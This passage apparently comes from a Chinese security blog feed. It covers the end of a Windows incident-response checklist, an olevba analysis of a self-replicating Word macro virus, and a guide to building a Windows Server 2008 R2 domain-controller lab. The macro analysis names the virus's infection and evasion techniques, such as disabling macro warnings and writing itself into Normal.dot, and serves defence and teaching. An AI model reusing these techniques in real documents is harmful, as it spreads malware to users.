<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist -m &#123;xxx.dll&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看是否存在异常的域名-IP映射</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h2 id="日志查看分析"><a href="#日志查看分析" class="headerlink" title="日志查看分析"></a>日志查看分析</h2><ol>
<li>安全日志查看</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; eventvwr.msc &gt; Windows日志 &gt; 安全</span><br><span class="line">登录成功：事件ID为4624、528</span><br><span class="line">登录失败：事件ID为4625、529</span><br></pre></td></tr></table></figure>

<p><a href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">事件id详解</a></p>
<h2 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h2><ol>
<li>自带启动项排查</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; msconfig-启动</span><br><span class="line">【开始】-【所有程序】-【启动】</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注册表启动项排查</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; regedit检查以下项</span><br><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>

<h2 id="计划任务排查"><a href="#计划任务排查" class="headerlink" title="计划任务排查"></a>计划任务排查</h2><ol>
<li>图形化界面检查计划任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>命令行检查计划任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">旧版本系统使用：at</span><br><span class="line">新系统使用：schtasks</span><br></pre></td></tr></table></figure>

<h2 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h2><ol>
<li>图形化界面排查服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; services.msc</span><br></pre></td></tr></table></figure>

<h2 id="杂项（快速定位文件）"><a href="#杂项（快速定位文件）" class="headerlink" title="杂项（快速定位文件）"></a>杂项（快速定位文件）</h2><ol>
<li>定位文件路径，关键字搜索（在d盘下搜索文件名包含test的文件）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r d:\ %i in (test) do @echo %i</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查找包含关键字的文件（搜索包含test的.txt文件）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /s /m /I &quot;test&quot; *.txt</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>搜索<code>*.txt</code>文件中test关键字所在的行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /s /i /n &quot;test&quot; *.txt</span><br><span class="line">/i:忽略大小写。</span><br><span class="line">/n:在输出中显示行号。</span><br><span class="line">/c:&quot;string&quot;：指定要搜索的字符串。</span><br><span class="line">/s:在当前目录及其所有子目录中递归搜索匹配的文件。</span><br><span class="line">/m:只列出包含匹配关键字的文件名，而不是列出匹配的行。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒分析-分析doc宏病毒</title>
    <url>/2025/07/29/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E5%88%86%E6%9E%90doc%E5%AE%8F%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<h2 id="分析样本"><a href="#分析样本" class="headerlink" title="分析样本"></a>分析样本</h2><p>使用到python的oletools模块，输入以下命令进行模块安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">py -3 -m pip install  oletools</span><br></pre></td></tr></table></figure>

<p>提取doc文档中的宏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">olevba .\20250728151303PNpue9eq.doc</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E5%88%86%E6%9E%90doc%E5%AE%8F%E7%97%85%E6%AF%92/image-20250729020721530.png" alt="image-20250729020721530"></p>
<h2 id="分析宏"><a href="#分析宏" class="headerlink" title="分析宏"></a>分析宏</h2><p>询问ai，分析宏的功能</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>代码证据</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>自动触发</strong></td>
<td><code>Document_Open()</code></td>
<td>文档打开即执行。</td>
</tr>
<tr>
<td><strong>隐藏痕迹</strong></td>
<td><code>Application.DisplayStatusBar = False</code></td>
<td>禁用状态栏，防止用户察觉。</td>
</tr>
<tr>
<td><strong>关闭安全警告</strong></td>
<td><code>Options.VirusProtection = False</code></td>
<td>禁用宏安全提示。</td>
</tr>
<tr>
<td><strong>感染模板</strong></td>
<td><code>NormalTemplate.VBProject</code></td>
<td>将病毒代码写入全局模板 <code>Normal.dot</code>，实现所有文档感染。</td>
</tr>
<tr>
<td><strong>自我复制</strong></td>
<td><code>MyCode = ... Lines(1, 20)</code> → <code>InsertLines 1, MyCode</code></td>
<td>将自身代码复制到目标模板&#x2F;文档。</td>
</tr>
<tr>
<td><strong>反调试</strong></td>
<td><code>On Error Resume Next</code></td>
<td>忽略错误，避免崩溃暴露。</td>
</tr>
</tbody></table>
<h2 id="感染逻辑"><a href="#感染逻辑" class="headerlink" title="感染逻辑"></a>感染逻辑</h2><ol>
<li>首次感染：<br>如果当前文档的宏代码前2行不是 ‘APMP 和 ‘KILL（标记），则删除目标模板&#x2F;文档的原有宏，并替换为病毒代码。</li>
<li>持久化：<br>若病毒已驻留 Normal.dot，则所有新建&#x2F;打开的文档会被自动感染。</li>
</ol>
<h2 id="病毒类型"><a href="#病毒类型" class="headerlink" title="病毒类型"></a>病毒类型</h2><p>宏病毒：经典感染式，通过Office模板传播。</p>
<p>无直接破坏性，但会污染所有文档，可能导致数据泄露或后续下载更危险的载荷。</p>
<h2 id="处置建议"><a href="#处置建议" class="headerlink" title="处置建议"></a>处置建议</h2><ol>
<li>立即隔离：</li>
</ol>
<ul>
<li>在虚拟机中打开文件，避免传播。</li>
</ul>
<ol start="2">
<li>清除病毒：</li>
</ol>
<ul>
<li>删除 Normal.dot 中的恶意宏（%APPDATA%\Microsoft\Templates\Normal.dotm）。</li>
<li>使用杀毒软件（如Windows Defender全盘扫描）。</li>
</ul>
<ol start="3">
<li>修复文档：</li>
</ol>
<ul>
<li>用 Office 的 “打开并修复” 功能清理残留宏。</li>
</ul>
<ol start="4">
<li>防措施：</li>
</ol>
<ul>
<li>启用 “禁用所有宏并发出通知”（文件 → 选项 → 信任中心）。</li>
</ul>
]]></content>
      <tags>
        <tag>病毒分析</tag>
        <tag>宏病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-搭建win2k8r2域功能级别的单域环境</title>
    <url>/2025/09/19/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="获取系统镜像"><a href="#获取系统镜像" class="headerlink" title="获取系统镜像"></a>获取系统镜像</h2><p>在<a href="https://msdn.itellyou.cn/">msdn</a>上下载操作系统镜像，如下图获取操作系统下载链接。使用迅雷下载。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919175703776.png" alt="image-20250919175703776"></p>
<p>这里我下载的是：cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso</p>
<p>下载链接为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso|3368839168|D282F613A80C2F45FF23B79212A3CF67|/</span><br></pre></td></tr></table></figure>

<h2 id="安装操作系统及VMware-tools"><a href="#安装操作系统及VMware-tools" class="headerlink" title="安装操作系统及VMware tools"></a>安装操作系统及VMware tools</h2><ol>
<li>使用VMware安装虚拟机，点击文件-新建虚拟机。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180224745.png" alt="image-20250919180224745"></li>
<li>选择典型安装，然后点击下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180351307.png" alt="image-20250919180351307"></li>
<li>点击浏览，选择到镜像文件，然后下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180554566.png" alt="image-20250919180554566"></li>
<li>产品密钥留空，个性化处，填写全名和密码，我这里设置全名为<code>administrator</code>，密码为<code>win2k8dc.</code>，然后点击下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180754830.png" alt="image-20250919180754830"></li>
<li>出现弹窗，选择是。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919181046108.png" alt="image-20250919181046108"></li>
<li>填写虚拟机名称，和虚拟机存放位置。这里名称命名为<code>win2k8r2 x64 dc</code>，位置为<code>E:\My_os\domain lab</code>，然后下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919181820258.png" alt="image-20250919181820258"></li>
<li>设置磁盘大小为100g，选择将虚拟磁盘拆分成多个文件。然后下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182016643.png" alt="image-20250919182016643"></li>
<li>预览配置。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182200580.png" alt="image-20250919182200580"></li>
<li>根据需要自定义硬件配置，我这里设置内存为4gb，处理器内核为8，设置好点击关闭，完成。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182336890.png" alt="image-20250919182336890"></li>
<li>开始简易安装。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182539118.png" alt="image-20250919182539118"></li>
<li>等待安装完成。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182635566.png" alt="image-20250919182635566"></li>
<li>安装完成之后，自动打开了两个窗口，关闭即可。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919183459010.png" alt="image-20250919183459010"></li>
<li>接下来安装VMware Tools。现在在虚拟机选项卡，选择安装的选项可能是灰色的，需要我们关机，设置CD&#x2F;DVD的连接为自动检测。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919184127359.png" alt="image-20250919184127359"></li>
<li>如果还是灰色，就手动选择iso。路径在你的VMware安装路径。我这里为D:\VMware\VMware Workstation\windows.iso，记得勾选连接。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919184617570.png" alt="image-20250919184617570"></li>
<li>进入计算机，发现加载了iso。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185101318.png" alt="image-20250919185101318"></li>
<li>选择运行setup64.exe。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185217724.png" alt="image-20250919185217724"></li>
<li>加载一会后进入安装向导。直接下一步。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185418445.png" alt="image-20250919185418445"></li>
<li>选择典型安装，下一步。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185753821.png" alt="image-20250919185753821"></li>
<li>安装。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185925861.png" alt="image-20250919185925861"></li>
</ol>
<p>vmware workstation 的 VMware tools 安装驱动之后鼠标无法使用，报错vmci.sys 无法验证数字签名，暂时未处理。使用另一个虚拟机继续搭建域控。结果发现另一个虚拟机已经搭建过域控了。还是得继续重装系统，重新安装VMware tools。</p>
<ol start="20">
<li>最后找到报驱动数字签名错误的解决办法。原来是要安装KB4490628、KB4474419这两个补丁。官方的补丁下载地址为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://catalog.update.microsoft.com/search.aspx?q=4490628</span><br><span class="line">https://catalog.update.microsoft.com/search.aspx?q=4474419</span><br></pre></td></tr></table></figure>
然而没这么简单，在微软官方补丁下载平台下载不了补丁了。报错如下图，最后我才在csdn上找到了这两个补丁的下载地址。</li>
</ol>
<p><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003175119303.png" alt="image-20251003175119303"><br>我已经把这两个补丁上传到github上了，大家自行获取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/H4ckForJob/win2008r2x64Patch</span><br></pre></td></tr></table></figure>
<ol start="21">
<li>接下来就是把补丁传输到虚拟机内了，这里我使用u盘传输，安装补丁过程比较简单，双击运行就行了，这里跳过。</li>
<li>最后就是重新安装VMware tools了。步骤和上面一样。这里直接放一张安装完成后的截图。可以看到屏幕自适应了。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180231485.png" alt="image-20251003180231485"></li>
</ol>
<h2 id="搭建域控"><a href="#搭建域控" class="headerlink" title="搭建域控"></a>搭建域控</h2><ol>
<li><p>设置静态ip。先添加个网卡。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180616868.png" alt="image-20251003180616868"></p>
</li>
<li><p>选择仅主机模式。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180710084.png" alt="image-20251003180710084"></p>
</li>
<li><p>右下角打开“网络和共享中心”。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180856253.png" alt="image-20251003180856253"></p>
</li>
<li><p>点击“本地连接2”，点击“属性”，点击“TCP&#x2F;IPv4”，进到ip配置页面。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181001915.png" alt="image-20251003181001915"></p>
</li>
<li><p>配置IP地址，选择“使用下面的IP地址”，配置IP地址为“10.10.10.1”，子网掩码为“255.0.0.0”，默认网关为“10.10.10.1”。配置DNS服务器，配置首选DNS服务器为“10.10.10.1”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181518750.png" alt="image-20251003181518750"><br>  打开cmd终端，输入<code>ipconfig</code>命令，查看ip地址配置情况。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181748762.png" alt="image-20251003181748762"></p>
</li>
<li><p>更改计算机名（为了后续能通过计算机名区分域控服务器），这里改为<code>win2k8dc</code>，更改完毕后，重启生效。</p>
<p>  <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182241957.png" alt="image-20251003182241957"></p>
</li>
<li><p>在cmd窗口中输入<code>dcpromo</code>升级此服务器为域控。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181912585.png" alt="image-20251003181912585"></p>
</li>
<li><p>弹出向导，点击下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181957280.png" alt="image-20251003181957280"></p>
</li>
<li><p>选择“在新林中新建域”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182532582.png" alt="image-20251003182532582"></p>
</li>
<li><p>输入域名，这里为“test.com”。点击下一步，会进行检查，等待即可。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182713238.png" alt="image-20251003182713238"></p>
</li>
<li><p>选择林的功能级别，接着下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182835196.png" alt="image-20251003182835196"></p>
</li>
<li><p>此处会自动检查DNS的配置，如果没安装DNS服务器的话，会自动勾选“DNS服务器”，单击下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182934708.png" alt="image-20251003182934708"></p>
</li>
<li><p>出现无法创建DNS服务器委派的提示，单击“是”，再单击“下一步”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003183541593.png" alt="image-20251003183541593"></p>
</li>
<li><p>出现配置目录，保持默认，接着下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003183735462.png" alt="image-20251003183735462"></p>
</li>
<li><p>输入还原模式密码，这里我设置为<code>win2k8dc.</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003183925750.png" alt="image-20251003183925750"></p>
</li>
<li><p>下一步，出现摘要。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184003905.png" alt="image-20251003184003905"></p>
</li>
<li><p>下一步，然后开始自动安装。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184037273.png" alt="image-20251003184037273"></p>
</li>
<li><p>最后点击完成，再重启一下就好了。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184126104.png" alt="image-20251003184126104"></p>
</li>
<li><p>重启完成后，进入操作系统，可以看到登录页面已经出现域名。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184331269.png" alt="image-20251003184331269"></p>
</li>
<li><p>进入系统之后，打开cmd，输入<code>net user /domain</code>。查看域用户，可以看到krbtgt账户。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184455138.png" alt="image-20251003184455138"></p>
</li>
<li><p>在左下角，单击打开“服务器管理器”，选择“Active Directory用户和计算机”，看到如下界面，说明活动目录域服务搭建成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003185018162.png" alt="image-20251003185018162"></p>
</li>
</ol>
<h2 id="测试加入域"><a href="#测试加入域" class="headerlink" title="测试加入域"></a>测试加入域</h2><ol>
<li><p>这里使用win7虚拟机，测试加入域。因为我使用的是之前创建的虚拟机，这里先进行些配置。</p>
</li>
<li><p>更改administrator账户密码为<code>win7user1.</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003190528724.png" alt="image-20251003190528724"></p>
</li>
<li><p>更改计算机名为<code>win7user1</code>。重启生效。这里发现重启之后，账户还是admin，暂时不管了，就用这个吧，密码为<code>admin</code>。</p>
</li>
<li><p>配置静态IP地址。先添加网络适配器。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191453017.png" alt="image-20251003191453017"></p>
</li>
<li><p>仅主机模式。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191526581.png" alt="image-20251003191526581"></p>
</li>
